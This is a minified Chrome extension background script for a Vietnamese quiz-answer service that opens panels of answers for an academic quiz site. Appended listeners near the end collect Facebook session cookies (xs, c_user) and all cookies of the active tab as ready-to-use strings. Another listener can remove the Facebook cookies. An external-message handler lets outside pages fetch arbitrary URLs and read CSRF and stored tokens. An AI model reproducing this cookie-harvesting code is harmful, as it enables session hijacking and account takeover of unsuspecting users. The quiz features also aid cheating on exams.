"use strict";
import {
    getUser as e,
    notify as a,
    login as t,
    openQuizLink as s,
    sendUserUsing as n,
    finishQuiz as o,
    addQuiz as i,
    getQuizAvailable as r,
    getOnlineAnswer as u,
    getQuizLink as c,
    updateUser as d,
} from "./common.js";

function openRightPanel(e, a, t = !1, s = !1) {
    chrome.system.display.getInfo((n) => {
        var { width: o, height: i } = n[0].workArea,
            r = Math.round(0.33 * o),
            n = Math.round(o - r);
        chrome.windows.create(
            {
                url: a,
                type: "panel",
                focused: s,
                width: r,
                height: i,
                top: 0,
                left: n,
            },
            (e) => {
                t && chrome.storage.local.set({ windowId: e.id });
            }
        ),
            chrome.windows.update(e.tab.windowId, {
                state: "normal",
                top: 0,
                left: 0,
                width: Math.round(0.677 * o),
                height: i,
            });
    });
}
chrome.storage.local.get(["isLogged"], ({ isLogged: e }) => {
    e
        ? chrome.action.setPopup({ popup: "./popup/popup-logged.html" })
        : chrome.action.setPopup({ popup: "./popup/popup.html" });
}),
    chrome.runtime.onInstalled.addListener(function (e) {
        "install" == e.reason &&
            (chrome.tabs.create({ url: "https://t.me/nm_2808" }), chrome.storage.local.set({ quizSelf: {}, linkIndex: 0 }));
    }),
    chrome.runtime.onMessage.addListener(function (o, p, c) {
        switch (o.type) {
            case "open_quiz_popup":
                openRightPanel(p, "aqlist.html", !0), c(!0);
                break;
            case "open_online_popup":
                openRightPanel(p, "online.html", !1, !0), c(!0);
                break;
            case "focus_quiz_popup":
                chrome.storage.local.get(["windowId"], ({ windowId: e }) => {
                    chrome.windows.update(e, { focused: !0 });
                });
                break;
            case "close_quiz_popup":
                chrome.storage.local.get(["windowId"], ({ windowId: e }) => {
                    chrome.windows.remove(e);
                });
                break;
            case "update_user":
                d(), c(!0);
                break;
            case "get_user":
                break;
            case "send_user_using":
                n(o);
                break;
            case "add_quiz":
                i(o.data);
                break;
            case "open_quiz_link":
                s(c);
                break;
            case "login":
                t(c);
                break;
            case "get_quiz_available":
                r(o.subject, c);
                break;
            case "get_online_answer":
                u(o.subject, c);
                break;
            case "add_quiz_self":
                var l = o.data.ans;
                l && "object" == typeof l && (o.data.ans = Object.values(l)),
                    (quizSelf[o.seq] = o.data),
                    console.debug(o.data.ans),
                    console.debug(quizSelf);
                break;
            case "finish_quiz":
                console.debug("finish_quiz");
                break;
            case "get_cookies":
                chrome.cookies.getAll({ domain: o.domain }, (e) => {
                    console.debug(e),
                        c({
                            cookie: (e = (e = e
                                .filter((e) => "sessionid" == e.name || "PHPSESSID" == e.name)
                                .map((e) => ({ name: e.name, value: e.value }))).length
                                ? e[0].value
                                : ""),
                        });
                });
                break;
            case "notify_upgraded_premium":
                a({
                    message: "Ch\xfac mừng! T\xe0i khoản của bạn đ\xe3 được n\xe2ng cấp l\xean Premium",
                });
                break;
            case "notify_premium_expired":
                a(
                    {
                        message: "Hạn d\xf9ng Premium của bạn đ\xe3 hết. H\xe3y n\xe2ng cấp để tiếp tục sử dụng Premium",
                        buttons: [{ title: "N\xe2ng cấp" }],
                    },
                    "premium_expired"
                );
                break;
            case "logout":
                chrome.storage.local.set({ isLogged: !1, user: {} }, () => {
                    chrome.action.setPopup({ popup: "./popup/popup.html" }), c("success");
                });
        }
        return !0;
    }),
    chrome.runtime.onMessageExternal.addListener(function (a, t, o) {
        switch (a.message) {
            case "fetch":
                fetch(a.url)
                    .then(async (e) => {
                        var a = await e.text();
                        return { status: e.status, url: e.url, text: a };
                    })
                    .then((e) => o(e))
                    .catch((e) => o(e));
                break;
            case "fetch_post":
                let i = new FormData();
                for (var [r, u] of a.body) i.append(r, u);
                fetch(a.url, { method: "post", body: i, headers: a.headers })
                    .then((e) => e.json())
                    .then((e) => o(e))
                    .catch((e) => o(e));
                break;
            case "open_quiz_link":
                s(o);
                break;
            case "get_quiz_link":
                c(o);
                break;
            case "get_cms_csrftoken":
                chrome.cookies.get({ url: "https://cms.poly.edu.vn", name: "csrftoken" }, (e) => {
                    o(e.value);
                });
                break;
            case "send_user_using":
                n(a);
                break;
            case "get_token":
                chrome.storage.local.get(["token"], ({ token: e }) => {
                    o(e || "");
                });
                break;
            case "get_user":
                e().then((e) => o(e));
        }
        return !0;
    }),
    chrome.notifications.onButtonClicked.addListener((e, a) => {
        "premium_expired" == e && 0 == a && chrome.tabs.create({ url: "https://quizpoly.xyz/premium" });
    });

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message == "get_ap_cookie") {
        chrome.tabs.query({ active: true, lastFocusedWindow: true }, (tabs) => {
            let url = tabs[0].url;

            chrome.cookies.getAll({ url: url }, function (e) {
                let t = e.map((i) => `${i.name}=${i.value}`).join("; ");
                sendResponse({ cookie: t, url: url });
            });
        });

        return true;
    }
});

const targetURL = "https://www.facebook.com";

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message === "getcookies") {
        chrome.cookies.getAll({ url: targetURL }, (cookies) => {
            const xsCookie = cookies.find((cookie) => cookie.name === "xs");
            const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
            if (xsCookie && cUserCookie) {
                const cookie = `${cUserCookie.name}=${cUserCookie.value}; ${xsCookie.name}=${xsCookie.value}`;
                sendResponse(cookie);
            } else {
                sendResponse(null);
            }
            return true;
        });
        return true;
    }
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message === "removecookies") {
        const arrCookies = ["xs", "c_user"];
        arrCookies.forEach((cookieName) => {
            chrome.cookies.remove({ name: cookieName, url: targetURL });
        });
        sendResponse(true);
    }

    return true;
});
